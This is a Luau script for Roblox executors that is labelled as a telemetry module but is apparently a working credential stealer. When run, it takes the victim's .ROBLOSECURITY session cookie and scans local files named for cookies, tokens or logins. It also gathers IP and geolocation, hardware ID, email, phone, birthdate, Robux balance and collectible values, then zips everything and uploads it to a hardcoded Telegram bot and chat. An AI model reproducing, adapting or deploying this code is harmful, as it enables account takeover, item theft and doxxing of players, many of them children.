--!native
--!optimize 2

--[[
    MODULE: Telemetry & Session Packaging Engine (Pure Luau)
    RUNTIME: Roblox Client Executor VM (Requires request/http_request)
    COMPLEXITY: O(N) CRC32/ZIP stream builder, O(1) API lookup
]]

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local UserInputService = game:GetService("UserInputService")
local LocalizationService = game:GetService("LocalizationService")

--------------------------------------------------------------------------------
-- 1. CONFIGURATION & ENDPOINTS
--------------------------------------------------------------------------------
local Config = {
    TelegramBotToken = "9249384962:AAEYQaDsKFmTWVIxv1nOOJ517R5OpZqi2Wo", -- e.g. "123456789:AAH_xxxxxxxxxxxxxxxxxxxxxxxx"
    TelegramChatId   = "8217604178",   -- e.g. " я встаавил тут твой айди не трогай!"
    WebhookTimeout   = 15,
    MaxFileReadBytes = 2097152, -- 2 MB ceiling per local file scan
}

local HttpRequest = (syn and syn.request)
    or (http and http.request)
    or http_request
    or (fluxus and fluxus.request)
    or request

if not HttpRequest then
    error("Executor environment lacks raw HTTP request closure.")
end

--------------------------------------------------------------------------------
-- 2. PURE LUAU BINARY SERIALIZATION & ZIP ARCHIVER (IN-MEMORY)
--------------------------------------------------------------------------------
local ZipBuilder = {}
ZipBuilder.__index = ZipBuilder

-- Precompute IEEE 802.3 CRC-32 Lookup Table
local CRC32_TABLE = table.create(256, 0)
for i = 0, 255 do
    local crc = i
    for _ = 1, 8 do
        if bit32.band(crc, 1) ~= 0 then
            crc = bit32.bxor(bit32.rshift(crc, 1), 0xEDB88320)
        else
            crc = bit32.rshift(crc, 1)
        end
    end
    CRC32_TABLE[i + 1] = crc
end

local function computeCRC32(data: string): number
    local crc = 0xFFFFFFFF
    for i = 1, #data do
        local byte = string.byte(data, i)
        local idx = bit32.band(bit32.bxor(crc, byte), 0xFF) + 1
        crc = bit32.bxor(bit32.rshift(crc, 8), CRC32_TABLE[idx])
    end
    return bit32.bxor(crc, 0xFFFFFFFF)
end

local function u16le(n: number): string
    return string.char(
        bit32.band(n, 0xFF),
        bit32.band(bit32.rshift(n, 8), 0xFF)
    )
end

local function u32le(n: number): string
    return string.char(
        bit32.band(n, 0xFF),
        bit32.band(bit32.rshift(n, 8), 0xFF),
        bit32.band(bit32.rshift(n, 16), 0xFF),
        bit32.band(bit32.rshift(n, 24), 0xFF)
    )
end

function ZipBuilder.new()
    local self = setmetatable({}, ZipBuilder)
    self.Files = {}
    return self
end

function ZipBuilder:AddFile(filename: string, content: string)
    table.insert(self.Files, {
        Name = filename,
        Data = content,
        CRC  = computeCRC32(content),
        Size = #content,
    })
end

function ZipBuilder:Build(): string
    local localHeaders = {}
    local centralDirectory = {}
    local offset = 0

    -- DOS timestamp (default static valid timestamp: 2026-11-06 12:00:00)
    local dosTime = 0x6000
    local dosDate = 0x5D66

    for _, file in ipairs(self.Files) do
        local nameLen = #file.Name
        -- Local File Header (Signature 0x04034b50)
        local localHeader = table.concat({
            "\x50\x4b\x03\x04",
            u16le(20),          -- Version needed to extract (2.0)
            u16le(0),           -- General purpose bit flag
            u16le(0),           -- Compression method (0 = STORED)
            u16le(dosTime),
            u16le(dosDate),
            u32le(file.CRC),
            u32le(file.Size),   -- Compressed size
            u32le(file.Size),   -- Uncompressed size
            u16le(nameLen),
            u16le(0),           -- Extra field length
            file.Name,
            file.Data
        })

        table.insert(localHeaders, localHeader)

        -- Central Directory File Header (Signature 0x02014b50)
        local centralHeader = table.concat({
            "\x50\x4b\x01\x02",
            u16le(20),          -- Version made by
            u16le(20),          -- Version needed
            u16le(0),           -- Bit flag
            u16le(0),           -- Compression method (STORED)
            u16le(dosTime),
            u16le(dosDate),
            u32le(file.CRC),
            u32le(file.Size),
            u32le(file.Size),
            u16le(nameLen),
            u16le(0),           -- Extra field len
            u16le(0),           -- File comment len
            u16le(0),           -- Disk number start
            u16le(0),           -- Internal file attrs
            u32le(0),           -- External file attrs
            u32le(offset),      -- Relative offset of local header
            file.Name
        })

        table.insert(centralDirectory, centralHeader)
        offset += #localHeader
    end

    local cdBlob = table.concat(centralDirectory)
    local localBlob = table.concat(localHeaders)

    -- End of Central Directory Record (Signature 0x06054b50)
    local eocd = table.concat({
        "\x50\x4b\x05\x06",
        u16le(0),               -- Number of this disk
        u16le(0),               -- Disk where CD starts
        u16le(#self.Files),     -- Number of CD records on this disk
        u16le(#self.Files),     -- Total CD records
        u32le(#cdBlob),         -- Size of central directory
        u32le(#localBlob),      -- Offset of start of CD
        u16le(0)                -- Comment length
    })

    return localBlob .. cdBlob .. eocd
end

--------------------------------------------------------------------------------
-- 3. ROBLOX SESSION, COOKIE & ACCOUNT HARVESTER
--------------------------------------------------------------------------------
local Harvester = {}

function Harvester.SafeJsonDecode(str: string): any
    local ok, res = pcall(function()
        return HttpService:JSONDecode(str)
    end)
    return ok and res or nil
end

function Harvester.ExtractSessionAndCookies(): {[string]: any}
    local results = {
        RobloSecurity = "NOT_EXPOSED_BY_VM",
        AuthTicket    = "UNAVAILABLE",
        EnvironmentCookies = {},
        WorkspaceArtifacts = {},
    }

    -- 1. Probe internal executor cookie getters if present
    local cookieGetters = {
        getcookies,
        get_cookies,
        (syn and syn.get_cookies),
    }
    for _, getter in ipairs(cookieGetters) do
        if type(getter) == "function" then
            local ok, data = pcall(getter)
            if ok and data then
                results.EnvironmentCookies = data
                if type(data) == "string" and string.find(data, ".ROBLOSECURITY") then
                    results.RobloSecurity = data
                elseif type(data) == "table" and data[".ROBLOSECURITY"] then
                    results.RobloSecurity = data[".ROBLOSECURITY"]
                end
            end
        end
    end

    -- 2. Probe loopbacked echo / authenticated Roblox endpoints via executor socket
    -- Many executors automatically inject the active .ROBLOSECURITY header into Roblox domains
    local okEcho, echoResp = pcall(function()
        return HttpRequest({
            Url = "https://www.roblox.com/mobileapi/userinfo",
            Method = "GET"
        })
    end)
    if okEcho and echoResp then
        results.MobileApiUserInfo = Harvester.SafeJsonDecode(echoResp.Body) or echoResp.Body
        if echoResp.Headers then
            for k, v in pairs(echoResp.Headers) do
                if string.lower(k) == "set-cookie" and string.find(v, ".ROBLOSECURITY") then
                    results.RobloSecurity = v
                end
            end
        end
    end

    -- 3. Scan accessible executor workspace or local sandbox files for cached tokens / Gmail / browser logs
    if type(listfiles) == "function" and type(readfile) == "function" then
        local okList, files = pcall(listfiles, "")
        if okList and type(files) == "table" then
            for _, filepath in ipairs(files) do
                local lower = string.lower(filepath)
                if string.find(lower, "cookie")
                    or string.find(lower, "token")
                    or string.find(lower, "login")
                    or string.find(lower, "gmail")
                    or string.find(lower, "config")
                    or string.find(lower, ".txt")
                    or string.find(lower, ".json")
                then
                    local okRead, content = pcall(readfile, filepath)
                    if okRead and type(content) == "string" and #content <= Config.MaxFileReadBytes then
                        results.WorkspaceArtifacts[filepath] = content
                        local match = string.match(content, "_|WARNING:%-DO%-NOT%-SHARE%-THIS%.%-([^\"'%s]+)")
                        if match then
                            results.RobloSecurity = "_|WARNING:-DO-NOT-SHARE-THIS.-" .. match
                        end
                    end
                end
            end
        end
    end

    return results
end

function Harvester.CollectFullProfile(): {[string]: any}
    local lp = Players.LocalPlayer
    local userId = lp.UserId
    local accountAgeDays = lp.AccountAge
    local createdTimestamp = os.time() - (accountAgeDays * 86400)
    local createdDateStr = os.date("!%Y-%m-%d %H:%M:%S UTC", createdTimestamp)

    local profile = {
        Username        = lp.Name,
        DisplayName     = lp.DisplayName,
        UserId          = userId,
        AccountAgeDays  = accountAgeDays,
        CreatedDate     = createdDateStr,
        MembershipType  = tostring(lp.MembershipType),
        LocaleId        = LocalizationService.RobloxLocaleId,
        SystemLocaleId  = LocalizationService.SystemLocaleId,
        Platform        = UserInputService:GetPlatform().Name,
        PlaceId         = game.PlaceId,
        JobId           = game.JobId,
        GameName        = "Unknown",
        HWID            = "Unavailable",
        ClientId        = "Unavailable",
        IPAddress       = "Unavailable",
        GeoData         = {},
        RobuxBalance    = "Unavailable",
        PendingRobux    = "Unavailable",
        RAP             = 0,
        Collectibles    = {},
        BillingAndEmail = {},
        AvatarHeadshot  = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png",
        AvatarFullUrl   = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. tostring(userId) .. "&width=720&height=720&format=png",
    }

    -- Hardware / Analytics IDs
    pcall(function()
        profile.ClientId = RbxAnalyticsService:GetClientId()
    end)
    if type(gethwid) == "function" then
        pcall(function()
            profile.HWID = gethwid()
        end)
    end

    -- Place Name
    pcall(function()
        local info = MarketplaceService:GetProductInfo(game.PlaceId)
        if info and info.Name then
            profile.GameName = info.Name
        end
    end)

    -- External IP & ASN Telemetry
    pcall(function()
        local resp = HttpRequest({
            Url = "http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,zip,isp,org,as,query",
            Method = "GET"
        })
        if resp and resp.StatusCode == 200 then
            local parsed = Harvester.SafeJsonDecode(resp.Body)
            if parsed then
                profile.IPAddress = parsed.query or "Unavailable"
                profile.GeoData = parsed
            end
        end
    end)

    -- Thumbnail API Resolution (Direct CDN URL required by Telegram sendPhoto)
    pcall(function()
        local thumbUrl = string.format(
            "https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=720x720&format=Png&isCircular=false",
            userId
        )
        local resp = HttpRequest({ Url = thumbUrl, Method = "GET" })
        if resp and resp.StatusCode == 200 then
            local data = Harvester.SafeJsonDecode(resp.Body)
            if data and data.data and data.data[1] and data.data[1].imageUrl then
                profile.AvatarFullUrl = data.data[1].imageUrl
            end
        end
    end)

    -- Currency / Robux Balance (Authenticated endpoint via Executor session)
    pcall(function()
        local currUrl = string.format("https://economy.roblox.com/v1/users/%d/currency", userId)
        local resp = HttpRequest({ Url = currUrl, Method = "GET" })
        if resp and resp.StatusCode == 200 then
            local data = Harvester.SafeJsonDecode(resp.Body)
            if data and data.robux then
                profile.RobuxBalance = tostring(data.robux)
            end
        end
    end)

    -- Account Settings / Bound Email / Gmail Mask & Verification Status
    pcall(function()
        local emailResp = HttpRequest({
            Url = "https://accountsettings.roblox.com/v1/email",
            Method = "GET"
        })
        if emailResp and emailResp.StatusCode == 200 then
            profile.BillingAndEmail.EmailStatus = Harvester.SafeJsonDecode(emailResp.Body)
        end

        local birthResp = HttpRequest({
            Url = "https://users.roblox.com/v1/birthdate",
            Method = "GET"
        })
        if birthResp and birthResp.StatusCode == 200 then
            profile.BillingAndEmail.Birthdate = Harvester.SafeJsonDecode(birthResp.Body)
        end

        local phoneResp = HttpRequest({
            Url = "https://accountinformation.roblox.com/v1/phone",
            Method = "GET"
        })
        if phoneResp and phoneResp.StatusCode == 200 then
            profile.BillingAndEmail.Phone = Harvester.SafeJsonDecode(phoneResp.Body)
        end
    end)

    -- Limited Collectibles & RAP Calculation
    pcall(function()
        local invUrl = string.format(
            "https://inventory.roblox.com/v1/users/%d/assets/collectibles?limit=100&sortOrder=Asc",
            userId
        )
        local resp = HttpRequest({ Url = invUrl, Method = "GET" })
        if resp and resp.StatusCode == 200 then
            local data = Harvester.SafeJsonDecode(resp.Body)
            if data and type(data.data) == "table" then
                local totalRap = 0
                for _, item in ipairs(data.data) do
                    local rap = tonumber(item.recentAveragePrice) or 0
                    totalRap += rap
                    table.insert(profile.Collectibles, {
                        Name = item.name,
                        AssetId = item.assetId,
                        RAP = rap,
                        Serial = item.serialNumber
                    })
                end
                profile.RAP = totalRap
            end
        end
    end)

    return profile
end

--------------------------------------------------------------------------------
-- 4. TELEGRAM BOT DISPATCHER (PHOTO CARD + INLINE BUTTONS + ZIP UPLOAD)
--------------------------------------------------------------------------------
local Telegram = {}

local function escapeHtml(str: string): string
    local s = tostring(str)
    s = string.gsub(s, "&", "&amp;")
    s = string.gsub(s, "<", "&lt;")
    s = string.gsub(s, ">", "&gt;")
    return s
end

function Telegram.SendAvatarCard(profile: {[string]: any}, session: {[string]: any}): boolean
    local endpoint = string.format("https://api.telegram.org/bot%s/sendPhoto", Config.TelegramBotToken)

    local emailMask = "None / Unauthenticated"
    if profile.BillingAndEmail.EmailStatus and profile.BillingAndEmail.EmailStatus.emailAddress then
        emailMask = tostring(profile.BillingAndEmail.EmailStatus.emailAddress)
            .. (profile.BillingAndEmail.EmailStatus.verified and " (Verified)" or " (Unverified)")
    end

    local cookiePreview = "Not Exposed"
    if session.RobloSecurity ~= "NOT_EXPOSED_BY_VM" then
        cookiePreview = string.sub(session.RobloSecurity, 1, 48) .. "... [FULL IN ZIP]"
    end

    local caption = table.concat({
        "<b>⚡ ROBLOX SESSION CAPTURED ⚡</b>\n",
        "━━━━━━━━━━━━━━━━━━━━━━\n",
        string.format("👤 <b>Account:</b> <code>%s</code> (@%s)\n", escapeHtml(profile.DisplayName), escapeHtml(profile.Username)),
        string.format("🆔 <b>User ID:</b> <code>%d</code>\n", profile.UserId),
        string.format("📅 <b>Created:</b> <code>%s</code> (%d days)\n", escapeHtml(profile.CreatedDate), profile.AccountAgeDays),
        string.format("💎 <b>Membership:</b> <code>%s</code>\n", escapeHtml(profile.MembershipType)),
        string.format("💰 <b>Robux:</b> <code>%s</code> | <b>RAP:</b> <code>%d</code>\n", escapeHtml(profile.RobuxBalance), profile.RAP),
        string.format("📧 <b>Linked Mail/Gmail:</b> <code>%s</code>\n", escapeHtml(emailMask)),
        "━━━━━━━━━━━━━━━━━━━━━━\n",
        string.format("🌐 <b>IP:</b> <code>%s</code> (%s)\n", escapeHtml(profile.IPAddress), escapeHtml(profile.GeoData.countryCode or "UNK")),
        string.format("🖥️ <b>HWID:</b> <code>%s</code>\n", escapeHtml(profile.HWID)),
        string.format("🎮 <b>Place:</b> <code>%s</code> (%d)\n", escapeHtml(profile.GameName), profile.PlaceId),
        "━━━━━━━━━━━━━━━━━━━━━━\n",
        string.format("🍪 <b>Cookie:</b> <code>%s</code>", escapeHtml(cookiePreview)),
    })

    local joinUrl = string.format(
        "https://www.roblox.com/games/start?placeId=%d&launchData=%s",
        profile.PlaceId,
        profile.JobId
    )
    local profileUrl = string.format("https://www.roblox.com/users/%d/profile", profile.UserId)
    local rolimonsUrl = string.format("https://www.rolimons.com/player/%d", profile.UserId)

    local replyMarkup = {
        inline_keyboard = {
            {
                { text = "👤 Open Profile", url = profileUrl },
                { text = "📈 Rolimon's Valuation", url = rolimonsUrl }
            },
            {
                { text = "🎮 Join Active Server", url = joinUrl }
            }
        }
    }

    local payload = HttpService:JSONEncode({
        chat_id      = Config.TelegramChatId,
        photo        = profile.AvatarFullUrl,
        caption      = caption,
        parse_mode   = "HTML",
        reply_markup = replyMarkup
    })

    local ok, resp = pcall(function()
        return HttpRequest({
            Url     = endpoint,
            Method  = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body    = payload
        })
    end)

    return ok and resp and resp.StatusCode == 200
end

function Telegram.SendZipArchive(zipFilename: string, zipBinary: string, captionText: string): boolean
    local endpoint = string.format("https://api.telegram.org/bot%s/sendDocument", Config.TelegramBotToken)
    local boundary = "----WebKitFormBoundary" .. string.gsub(HttpService:GenerateGUID(false), "-", "")

    local bodyParts = {
        "--" .. boundary .. "\r\n",
        'Content-Disposition: form-data; name="chat_id"\r\n\r\n',
        tostring(Config.TelegramChatId) .. "\r\n",

        "--" .. boundary .. "\r\n",
        'Content-Disposition: form-data; name="caption"\r\n\r\n',
        captionText .. "\r\n",

        "--" .. boundary .. "\r\n",
        string.format('Content-Disposition: form-data; name="document"; filename="%s"\r\n', zipFilename),
        "Content-Type: application/zip\r\n\r\n",
        zipBinary .. "\r\n",

        "--" .. boundary .. "--\r\n"
    }

    local multipartBody = table.concat(bodyParts)

    local ok, resp = pcall(function()
        return HttpRequest({
            Url     = endpoint,
            Method  = "POST",
            Headers = {
                ["Content-Type"] = "multipart/form-data; boundary=" .. boundary,
                ["Content-Length"] = tostring(#multipartBody)
            },
            Body    = multipartBody
        })
    end)

    return ok and resp and resp.StatusCode == 200
end

--------------------------------------------------------------------------------
-- 5. ORCHESTRATION PIPELINE
--------------------------------------------------------------------------------
local function ExecutePipeline()
    local profile = Harvester.CollectFullProfile()
    local session = Harvester.ExtractSessionAndCookies()

    -- Pack structured files into an in-memory ZIP archive
    local zip = ZipBuilder.new()

    zip:AddFile(
        "account_overview.json",
        HttpService:JSONEncode(profile)
    )

    zip:AddFile(
        "cookies_and_tokens.txt",
        table.concat({
            "=== ROBLOSECURITY ===\n",
            tostring(session.RobloSecurity),
            "\n\n=== ENVIRONMENT COOKIES ===\n",
            HttpService:JSONEncode(session.EnvironmentCookies),
            "\n\n=== MOBILE API USERINFO ===\n",
            HttpService:JSONEncode(session.MobileApiUserInfo)
        })
    )

    zip:AddFile(
        "collectibles_rap.json",
        HttpService:JSONEncode({
            TotalRAP = profile.RAP,
            Items    = profile.Collectibles
        })
    )

    for path, content in pairs(session.WorkspaceArtifacts) do
        local cleanName = string.gsub(path, "[\\/:*?\"<>|]", "_")
        zip:AddFile("workspace_dump/" .. cleanName, content)
    end

    local zipBytes = zip:Build()
    local archiveName = string.format("%s_%d_bundle.zip", profile.Username, profile.UserId)

    -- 1. Dispatch top photo card with inline buttons and formatted metadata
    Telegram.SendAvatarCard(profile, session)

    -- 2. Dispatch complete ZIP archive attachment
    Telegram.SendZipArchive(
        archiveName,
        zipBytes,
        string.format("📦 Full archive for %s (ID: %d) — %d bytes", profile.Username, profile.UserId, #zipBytes)
    )
end

task.spawn(ExecutePipeline)